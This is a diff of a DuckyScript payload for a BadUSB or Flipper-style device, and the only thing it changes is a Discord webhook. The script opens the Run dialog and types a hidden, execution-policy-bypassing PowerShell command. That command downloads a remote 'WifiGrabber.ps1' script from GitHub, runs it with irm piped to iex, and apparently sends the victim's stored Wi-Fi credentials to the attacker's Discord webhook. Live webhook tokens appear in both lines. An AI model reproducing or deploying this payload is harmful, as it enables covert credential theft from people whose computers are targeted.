@@ -1,5 +1,5 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1262881667228500030/DL8QXiRzV9FA_ogQcmWdbFOz0oshAEPG94soYeC9IEQe4tCsvyTg73zC0Cz2qF4av4Ky'; $db='' ; irm "https://raw.githubusercontent.com/Timmm27/BadUSB-Flipper-Jakoby/refs/heads/main/Wifi-Grabber/WifiGrabber.ps1" | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1311250539757043712/84grum52F8HYX_O7BMBLq6BnCT1mtMcD8ChC7rpCXo_Yx_oSx8SLaqX0d0IwiSXmOMvU'; $db='' ; irm "https://raw.githubusercontent.com/Timmm27/BadUSB-Flipper-Jakoby/refs/heads/main/Wifi-Grabber/WifiGrabber.ps1" | iex
 DELAY 100
 ENTER
